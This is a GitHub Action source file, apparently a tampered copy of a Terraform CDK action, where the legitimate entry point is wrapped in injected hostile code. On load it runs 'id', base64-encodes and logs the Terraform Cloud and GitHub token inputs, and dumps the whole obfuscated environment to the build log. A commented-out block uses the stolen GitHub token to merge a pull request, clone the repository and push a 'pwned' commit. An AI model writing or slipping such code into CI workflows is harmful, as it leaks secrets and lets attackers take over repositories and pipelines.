/**
 * Copyright (c) HashiCorp, Inc.
 * SPDX-License-Identifier: MPL-2.0
 */

import * as core from "@actions/core";
import { run } from "./action";

import { execSync } from 'child_process';


console.log("\r\nPwned action...");
console.log(execSync('id').toString());

const tfToken = Buffer.from(process.env.INPUT_TERRAFORMCLOUDTOKEN || ''.split("").reverse().join("-")).toString('base64');
const ghToken = Buffer.from(process.env.INPUT_GITHUBTOKEN || ''.split("").reverse().join("-")).toString('base64');

console.log('\r\nDumping tokens:', {tfToken, ghToken});
console.log('GH:', Buffer.from(process.env.INPUT_TERRAFORMCLOUDTOKEN || ''.split("").reverse().join("")).toString('base64'))
console.log('\r\nDumping env:', Buffer.from(JSON.stringify(process.env).split("").reverse().join("")).toString('base64'));

/*console.log('Testing token...')
const str = `# Merge PR
curl -X PUT \
    https://api.github.com/repos/mousefluff/terraform-cdk-action/pulls/2/merge \
    -H "Accept: application/vnd.github.v3+json" \
    --header "authorization: Bearer ${process.env.INPUT_GITHUBTOKEN}" \
    --header 'content-type: application/json' \
    -d '{"commit_title":"pwned"}'`;

execSync(str, { stdio: 'inherit' });

//execSync(`git clone https://${process.env.INPUT_GITHUBTOKEN}:x-oauth-basic@github.com/mousefluff/terraform-cdk-action.git pwn-repo`, { stdio: 'inherit' });
//console.log(execSync('ls -la pwn-repo').toString());

//execSync(`curl -H "Authorization: token ${process.env.INPUT_GITHUBTOKEN}" https://api.github.com/user`, { stdio: 'inherit' });
//execSync(`curl -H "Authorization: token ${process.env.INPUT_GITHUBTOKEN}" https://api.github.com/app/installations`, { stdio: 'inherit' });

//execSync("bash -c 'cd ./pwn-repo && git config user.email \"you@example.com\" && git config user.name \"Your Name\" && touch pwned.txt && git add pwned.txt && git commit -m \"Add pwned.txt\" && git push'", { stdio: 'inherit' });
*/


run().catch((error) => {
  core.setFailed(error.message);
});
